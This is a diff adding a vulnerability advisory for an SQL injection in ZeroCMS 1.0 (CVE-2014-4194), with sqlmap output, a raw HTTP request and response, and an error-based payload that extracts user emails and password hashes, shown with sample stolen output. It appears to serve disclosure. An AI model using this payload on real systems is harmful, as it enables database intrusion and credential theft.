@@ -1,0 +1,93 @@
+ZeroCMS v1.0 SQL Injection Vulnerability (zero_transact_article.php article_id POST parameter)
+
+Vendor: Another Awesome Stuff
+Product web page: http://www.aas9.in/zerocms
+Affected version: 1.0
+Severity: High
+CWE: 89 - http://cwe.mitre.org/data/definitions/89.html
+CVE: CVE-2014-4194
+Date: 20/06/2014
+
+Discovered by: Filippos Mastrogiannis (@filipposmastro)
+
+--------------------------------------------------------
+
+ZeroCMS is a very simple Content Management System Built using PHP and MySQL.
+
+Description: ZeroCMS v1.0 is vulnerable to SQL Injection.
+
+The user input which is passed via the "article_id" POST parameter of "zero_transact_article.php"
+is not properly sanitised allowing the attacker to inject arbitrary sql code and to
+execute queries to the database in order to extract sensitive information (e.g. credentials) and/or
+to take over the database/system.
+
+Proof Of Concept:
+
+A part of the sqlmap output:
+
+POST parameter 'article_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection points with a total of 261 HTTP(s) requests:
+---
+Place: POST
+Parameter: article_id
+..
+...
+....
+---
+[XX:XX:XX] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 12.04 (Precise Pangolin)
+web application technology: Apache 2.2.22, PHP 5.3.10
+back-end DBMS: MySQL 5.0
+[XX:XX:XX] [INFO] fetching current database
+current database:    'zero'
+..
+...
+....
+--------------------------------------------------------
+
+Proof Of Concept:
+
+Request:
+
+POST /zerocms/zero_transact_article.php HTTP/1.1
+Cache-Control: no-cache
+Referer: http://[Removed]/zerocms/zero_comment.php?article_id=9
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
+Accept-Language: en-us,en;q=0.5
+Host: [Removed]
+Cookie: PHPSESSID=[Removed]
+Accept-Encoding: gzip, deflate
+Content-Length: 53
+Content-Type: application/x-www-form-urlencoded
+
+action=Submit+Comment&article_id='&comment_text=3
+
+Response:
+
+HTTP/1.1 200 OK
+Date: [Removed]
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.11
+Expires: [Removed]
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 226
+Content-Type: text/html
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 3, "2014-XX-XX XX:XX:XX", ' at line 4
+
+--------------------------------------------------------
+
+Exploitation:
+
+For example if we want to extract: user_id, email, password from the database use the following payload in the article_id parameter of the POST request:
+
+action=Submit+Comment&article_id=5+and+(select 1 FROM(select count(*),concat((select+concat(email,0x3a,user_id,0x3a,password,0x3a) FROM zero_users LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)&comment_text=3
+
+(The database name in our setup is: zero & the session is from an authenticated user)
+
+If we look at the response we can see the extracted data:
+
+Duplicate entry 'admin@domain.com:1:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:1' for key 'group_key'
